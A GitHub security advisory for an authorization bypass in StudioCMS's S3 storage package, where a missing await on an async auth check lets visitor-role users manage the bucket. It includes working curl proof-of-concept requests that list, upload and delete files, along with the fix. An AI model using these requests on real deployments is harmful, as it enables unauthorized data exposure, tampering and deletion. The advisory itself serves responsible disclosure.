# [H] StudioCMS S3 Storage Manager Authorization Bypass via Missing `await` on Async Auth Check

## Summary
Severity: High
Advisory: GHSA-mm78-fgq8-6pgr
CVE: CVE-2026-32101
CWE: CWE-863
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L (CVSS_V3)
Published: 2026-03-12
Source: https://github.com/advisories/GHSA-mm78-fgq8-6pgr
Type: github-advisory

## Affected
- npm: `@studiocms/s3-storage` — affected >=0 <0.3.1

## Details
## Summary

The S3 storage manager's `isAuthorized()` function is declared `async` (returns `Promise<boolean>`) but is called without `await` in both the POST and PUT handlers. Since a Promise object is always truthy in JavaScript, `!isAuthorized(type)` always evaluates to `false`, completely bypassing the authorization check. Any authenticated user with the lowest `visitor` role can upload, delete, rename, and list all files in the S3 bucket.

## Details

The `isAuthorized` function is typed as returning `Promise<boolean>` in `packages/studiocms/src/handlers/storage-manager/definitions.ts:88`:

```typescript
export type ParsedContext = {
    getJson: () => Promise<ContextJsonBody>;
    getArrayBuffer: () => Promise<ArrayBuffer>;
    getHeader: (name: string) => string | null;
    isAuthorized: (type?: AuthorizationType) => Promise<boolean>;  // async
};
```

Both context drivers implement it as `async` — `packages/studiocms/src/handlers/storage-manager/core/effectify-astro-context.ts:32`:

```typescript
isAuthorized: async (type) => {
    switch (type) {
        case 'headers': {
            // ... token verification ...
            const isEditor = level >= UserPermissionLevel.editor;
            if (!isEditor) return false;
            return true;
        }
        default: {
            const isEditor = locals.StudioCMS.security?.userPermissionLevel.isEditor || false;
            return isEditor;
        }
    }
},
```

But in the S3 storage manager, it's called without `await` — `packages/@studiocms/s3-storage/src/s3-storage-manager.ts:200`:

```typescript
if (authRequiredActions.includes(jsonBody.action) && !isAuthorized(type)) {
    return { data: { error: 'Unauthorized' }, status: 401 };
}
```

And again at line 372 (PUT handler):

```typescript
if (!isAuthorized(type)) {
    return { data: { error: 'Unauthorized' }, status: 401 };
}
```

`isAuthorized(type)` returns a `Promise` object. `!Promise{...}` is always `false` because a Promise is truthy. The 401 response is never returned.

**Execution flow:**
1. Visitor-role user sends POST to `/studiocms_api/integrations/storage/manager`
2. `AstroLocalsMiddleware` verifies session exists — passes (visitor is logged in)
3. Handler calls `!isAuthorized('locals')` → evaluates `!Promise{...}` = `false`
4. Authorization check is skipped entirely
5. Visitor performs the requested storage operation

## PoC

```bash
# 1. Log in as a visitor-role user and obtain session cookie

# 2. List all files in S3 bucket (should require editor+)
curl -X POST 'http://localhost:4321/studiocms_api/integrations/storage/manager' \
  -H 'Cookie: studiocms-session=<visitor-session-token>' \
  -H 'Content-Type: application/json' \
  -d '{"action":"list","prefix":""}'

# Expected: 401 Unauthorized
# Actual: 200 with full bucket listing

# 3. Upload a file as visitor (should require editor+)
curl -X PUT 'http://localhost:4321/studiocms_api/integrations/storage/manager' \
  -H 'Cookie: studiocms-session=<visitor-session-token>' \
  -H 'Content-Type: application/octet-stream' \
  -H 'x-storage-key: malicious/payload.html' \
  --data-binary '<h1>Uploaded by visitor</h1>'

# Expected: 401 Unauthorized
# Actual: 200 File uploaded

# 4. Delete a file as visitor (should require editor+)
curl -X POST 'http://localhost:4321/studiocms_api/integrations/storage/manager' \
  -H 'Cookie: studiocms-session=<visitor-session-token>' \
  -H 'Content-Type: application/json' \
  -d '{"action":"delete","key":"important/document.pdf"}'

# Expected: 401 Unauthorized
# Actual: 200 File deleted
```

## Impact

- Any authenticated visitor gains full S3 storage management (upload, delete, rename, list) — capabilities restricted to editor role and above
- Attacker can delete arbitrary files from the S3 bucket, causing data loss
- Attacker can list all files and generate presigned download URLs, exposing all stored content
- Attacker can upload arbitrary files or rename existing ones, replacing legitimate content with malicious payloads

## Recommended Fix

Add `await` to both `isAuthorized()` calls in `packages/@studiocms/s3-storage/src/s3-storage-manager.ts`:

```typescript
// POST handler (line 200) — before:
if (authRequiredActions.includes(jsonBody.action) && !isAuthorized(type)) {

// After:
if (authRequiredActions.includes(jsonBody.action) && !(await isAuthorized(type))) {

// PUT handler (line 372) — before:
if (!isAuthorized(type)) {

// After:
if (!(await isAuthorized(type))) {
```

## References
- https://github.com/withstudiocms/studiocms/security/advisories/GHSA-mm78-fgq8-6pgr
- https://nvd.nist.gov/vuln/detail/CVE-2026-32101
- https://github.com/withstudiocms/studiocms
